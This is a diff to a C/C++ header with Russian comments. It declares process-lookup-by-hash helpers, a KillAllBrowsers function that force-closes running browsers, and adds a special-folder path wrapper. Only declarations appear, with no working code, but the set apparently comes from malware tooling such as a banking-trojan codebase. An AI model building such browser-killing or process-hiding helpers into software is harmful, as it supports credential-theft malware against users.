@@ -16,6 +16,7 @@
 
 
 DWORD GetProcessIdByHash( DWORD dwHash );
+
 //возвращает хеш процесса по пиду
 DWORD GetProcessHashOfId(DWORD dwPid);
 char *GetProcessList();
@@ -350,11 +351,19 @@ DWORD GetHashForPid( int pid );
 bool SizeFolderLess(const char* nameFolder, DWORD maxSize, DWORD* size = 0 );
 
 
-
-
 //------------------------------------------------------------
 //  KillAllBrowsers - Функция убивает все запущенные браузеры
 //------------------------------------------------------------
 void KillAllBrowsers();
+
+
+//------------------------------------------------------------
+//  GetSpecialFolderPath - Функция возвращает путь к
+//                          специальной папке системы
+//  (Надстройка над ЫРGetSpecialFolderPath)
+//
+//   AddName - Имя будет добавлено к пуолченному пути
+//------------------------------------------------------------
+string GetSpecialFolderPathA(int CSIDL, const char *AddName);
 
 #endif
